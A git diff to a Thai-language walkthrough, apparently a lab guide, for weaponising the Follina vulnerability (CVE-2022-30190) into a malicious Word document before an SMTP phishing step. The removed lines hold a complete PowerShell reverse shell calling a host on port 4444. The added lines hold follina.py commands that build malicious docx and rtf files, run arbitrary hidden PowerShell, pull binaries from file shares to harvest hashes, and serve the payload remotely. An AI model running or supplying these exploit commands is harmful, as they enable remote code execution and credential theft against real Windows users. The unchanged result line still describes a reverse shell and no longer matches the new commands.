@@ -84,10 +84,28 @@
   git clone https://github.com/DarkRelay-Security-Labs/CVE-2022-30190-Follina-exploit
   cd CVE-2022-30190-Follina-exploit
   ```
-- **สร้างไฟล์ `clickme.docx` พร้อม Reverse Shell**:
+- **สร้างไฟล์ `clickme.docx` สามารถใช้คำสั่งได้ตามนี้**:
+
   ```bash
-  python3 follina.py -t docx -m command -c "powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.Sockets.TCPClient('192.168.56.11',4444)).GetStream().Write((([text.encoding]::ASCII).GetBytes((whoami | Out-String) + 'PS ' + (pwd).Path + '> ')),0,(([text.encoding]::ASCII).GetBytes((whoami | Out-String) + 'PS ' + (pwd).Path + '> ')).Length);while($true){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString((New-Object byte[] 65535));$i = (New-Object System.Net.Sockets.TCPClient('192.168.56.11',4444)).GetStream().Read($data,0,$data.Length);if($i -ne 0){$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);(New-Object System.Net.Sockets.TCPClient('192.168.56.11',4444)).GetStream().Write($sendbyte,0,$sendbyte.Length)}}\""
+  # Execute a local binary
+  python follina.py -t docx -m binary -b \windows\system32\calc.exe
+  
+  # On linux you may have to escape backslashes
+  python follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe
+  
+  # Execute a binary from a file share (can be used to farm hashes 👀)
+  python follina.py -t docx -m binary -b \\localhost\c$\windows\system32\calc.exe
+  
+  # Execute an arbitrary powershell command
+  python follina.py -t rtf -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
+  
+  # Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
+  python follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4
+  
+  # Only run the webserver on localhost, on port 8080 instead of 80
+  python follina.py -t rtf -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
   ```
+  
 - **ผลลัพธ์**: ได้ไฟล์ `clickme.docx` ที่ฝังคำสั่ง PowerShell Reverse Shell
 
 ### 6. ตั้งค่าเซิร์ฟเวอร์ SMTP บน Kali
